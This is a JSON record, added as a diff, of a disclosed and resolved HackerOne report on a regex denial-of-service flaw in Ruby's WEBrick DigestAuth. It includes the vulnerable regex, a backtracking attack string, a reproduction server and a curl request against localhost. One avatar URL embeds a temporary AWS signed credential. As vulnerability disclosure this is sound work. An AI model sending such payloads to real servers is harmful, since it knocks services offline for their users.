@@ -1,0 +1,311 @@
+{
+    "id": 661722,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjE3MjI=",
+    "url": "https://hackerone.com/reports/661722",
+    "title": "WEBrick::HTTPAuth::DigestAuth authentication is vulnerable to regular expression denial of service (ReDoS)",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "low",
+    "readable_substate": "Resolved",
+    "created_at": "2019-07-27T05:44:24.810Z",
+    "submitted_at": "2019-07-27T05:44:24.810Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "358",
+        "url": "/358",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 7724,
+        "url": "https://hackerone.com/ruby",
+        "handle": "ruby",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Ruby",
+            "twitter_handle": "",
+            "website": "https://www.ruby-lang.org",
+            "about": "A Programmer's Best Friend"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2019-11-15T23:20:45.123Z",
+    "bug_reporter_agreed_on_going_public_at": null,
+    "team_member_agreed_on_going_public_at": "2019-10-16T23:20:40.329Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "The private instance method `split_param_value` in class `WEBrick::HTTPAuth::DigestAuth` uses a regular expression that is vulnerable to denial of service due to catastrophic backtracking.\n\nThe regular expression is: ^\\s*([\\w\\-\\.\\*\\%\\!]+)=\\s*\\\"((\\\\.|[^\\\"])*)\\\"\\s*,?\nSource: https://github.com/ruby/ruby/blob/149e414ed529d27aaeb0543bc133e08c782d8d41/lib/webrick/httpauth/digestauth.rb#L295\n\nSample attack string that causes catastrophic backtracking: a=\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\n\nThe issue can be reproduced with the following HTTP server configured with DigestAuth:\n\n```\n#!/usr/bin/env ruby\n\nrequire 'webrick'\n\nconfig = { :Realm => 'DigestAuth example realm' }\n\nhtdigest = WEBrick::HTTPAuth::Htdigest.new 'my_password_file'\nhtdigest.set_passwd config[:Realm], 'username', 'password'\nhtdigest.flush\n\nconfig[:UserDB] = htdigest\n\ndigest_auth = WEBrick::HTTPAuth::DigestAuth.new config\n\nauth_handler = proc do |request, response|\n  digest_auth.authenticate request, response\nend\n\nserver = WEBrick::HTTPServer.new :Port => 8000, :RequestCallback => auth_handler\n\nserver.mount_proc '/' do |req, res|\n  res.body = 'hello, world'\nend\n\ntrap 'INT' do server.shutdown end\nserver.start\n```\n\nRunning the program above, an attacker can cause the HTTP server to consume 100% CPU by sending an authorization header that exploits the catastrophic backtracking.\n\nSample HTTP request with cURL:\n```sh\n$ time curl -I --header 'Authorization: Digest a=\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b' http://localhost:8000\nHTTP/1.1 400 Bad Request \nContent-Type: text/html; charset=ISO-8859-1\nServer: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)\nDate: Sat, 27 Jul 2019 05:38:27 GMT\nContent-Length: 291\nConnection: close\n\n\nreal\t0m9.714s\nuser\t0m0.013s\nsys\t0m0.003s\n```\n\nNote that it takes the HTTP server 9 seconds to respond that it's a bad request. A larger attack string, like 'Authorization: Digest a=\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b', would take much longer to evaluate.\n\n## Impact\n\nAn attacker could cause an effective denial of service, by crafting an input which exploits catastrophic backtracking for the regular expression.",
+    "weakness": {
+        "id": 48,
+        "name": "Denial of Service"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": "2019-11-15T23:20:40.416Z",
+    "allow_singular_disclosure_after": -119434077.3140628,
+    "singular_disclosure_allowed": true,
+    "vote_count": 16,
+    "voters": [
+        "bl4de",
+        "mik317",
+        "eren",
+        "r0hack",
+        "khizer47",
+        "lumbridge",
+        "t3chn0phil3",
+        "cryptographer",
+        "kwalberg",
+        "shkhan922",
+        "and 6 more..."
+    ],
+    "severity": {
+        "rating": "low",
+        "score": 3.7,
+        "author_type": "Team",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "high",
+            "privileges_required": "none",
+            "user_interaction": "none",
+            "scope": "unchanged",
+            "confidentiality": "none",
+            "integrity": "none",
+            "availability": "low"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 28212,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/ruby/ruby",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 5459774,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @358,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ",
+            "automated_response": false,
+            "created_at": "2019-07-30T07:37:03.153Z",
+            "updated_at": "2019-07-30T07:37:03.153Z",
+            "actor": {
+                "username": "beagle",
+                "cleared": false,
+                "verified": false,
+                "url": "/beagle",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 5725099,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-09-04T06:37:06.892Z",
+            "updated_at": "2019-09-04T06:37:06.892Z",
+            "additional_data": {
+                "old_severity": null,
+                "new_severity": "Low (3.7)",
+                "old_severity_id": null,
+                "new_severity_id": 508157
+            },
+            "actor": {
+                "username": "beagle",
+                "cleared": false,
+                "verified": false,
+                "url": "/beagle",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 5725101,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ",
+            "automated_response": false,
+            "created_at": "2019-09-04T06:37:14.277Z",
+            "updated_at": "2019-09-04T06:37:14.277Z",
+            "actor": {
+                "username": "beagle",
+                "cleared": false,
+                "verified": false,
+                "url": "/beagle",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 6059777,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "This issue was fixed at Ruby 2.6.5/2.5.7/2.4.8. Thank you for the report. I'll leave the bounty handling to IBB.",
+            "automated_response": false,
+            "created_at": "2019-10-16T23:17:32.251Z",
+            "updated_at": "2019-10-16T23:17:32.251Z",
+            "actor": {
+                "username": "mame",
+                "cleared": false,
+                "verified": false,
+                "url": "/mame",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "358",
+                "url": "/358"
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 6059802,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-10-16T23:20:32.837Z",
+            "updated_at": "2019-10-16T23:20:32.837Z",
+            "actor": {
+                "url": "/ruby",
+                "ibb": true,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Ruby"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "ruby",
+            "collaborator": {
+                "username": "358",
+                "url": "/358"
+            }
+        },
+        {
+            "id": 6059803,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-10-16T23:20:40.349Z",
+            "updated_at": "2019-10-16T23:20:40.349Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "hsbt",
+                "cleared": false,
+                "verified": false,
+                "url": "/hsbt",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4N3L6HVK%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072837Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEt4ffSVAwnkR7Gt9YHrh2mIYz2YHZKnL1I%2FxRODgQIJAiEAhqrstVpa8vzaI37yef%2FkTFlYpzB9%2BUB%2FeR%2FQRtP%2BH2squgUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMO5QUZmlOhJgruQOyqOBQtDUp3uDHv2jY6x0yE0OADdY1ooh28osZSuWI7OuePExEgOiw7z8uNp%2BRvZJ75q%2FJ7cG2CMMlV2SncTPeStOQTR7nCQydCl7iTiYDK8cxNqm30yTAFHrKq%2FBYstOkzo0BEUqmTqeLMAgZzUpprsA%2Bq8%2BqwyxN79JwG4OH3bUyjp7Rip33VeFRZFgv18Cc7kN3M4G4LsNYA20k1oL9QN9MI4z5%2Bkqri6Wtn1pJAw6IK9ApXr2uUB3HiRpxQxPT2jgscFdVTTtvnz6u7IHYVUtLfgzKNZdOA0FluiFpflfo217pIzGcZzI41isFU%2BABYu3ccUGmZNnCljTxmTtMxDkATbwY5BQdVVVy7s7nI1oaWL69va0fsaf5t8%2BZtCgE7IVK%2B69s4pnTYiPi9XPJzErs27S6RGtkHmkcxIj2zhTR6YpYUUWKiNelS2tCNQBIhUAJHbj2TEnuGN%2B0mFdojuGhulUnHHJ5Mo8GPgSbtK4h4VIocXITtGf%2F2Ilr%2BORY%2FJublfnM%2Bxze0THnPuQIFbySXgQ0OytUijrH%2FPIM70li%2FLiFZYOs2GOvqIAcPVICmF1tV8VaDtc4UHvfB3sHogmsLsVGEsqv%2BZhnFFkXkBPzfFL3JoSk%2FBn%2BRzVamXhI%2BUoPWuENj%2BFAJE397SYp3tyj0hiL3euwcEmSnfym3bMyfKA1KKkk%2FhSbOQ0%2FMvQzjgDjygrTh1fZnRcyFaWWlUVq89ngeMXNUQhAa4W%2BBU9cIp28iMYL5f8FY4dS1RHnh7d1E7qGa%2FuSWlfO0vW0C400gwAltilckIWBmgPNAkl6TPqRgx0MtoDdoLCSaKdB%2BpNa%2F0q5n3y7dzn8Ev8%2F8Fcd0G2xdYsOpUXeug96KhxDCHpbanBjqxAfI5U%2BnCoiaHfEl5Rs64icg5LllDgheE%2B%2BO4VpE6nN2q1YoMjNWLoeinCHZazaS9Q0XVN9QhluG25BFy172zKjBnv6faSMvFq69uXL9SlLa1tQEsjWqg3YlalreBmKsB1Yc6G5csbu5x5PpYWSwEe1%2B6b4N9LyDeM3lYe5aY4l9uDJ0Mf7bRWv8ZGhiyXIOXv3alyq8zuaz4Cqfk0ADUAChIqZIR0ylybsR8nt%2BSw3L8EQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9af83be9f444b82e6b0bb6e151f79a71b72ed3bfa42dfa39cd648760d9ca7eba"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 6320729,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-11-15T23:20:45.148Z",
+            "updated_at": "2019-11-15T23:20:45.148Z",
+            "actor": {
+                "url": "/ruby",
+                "ibb": true,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Ruby"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
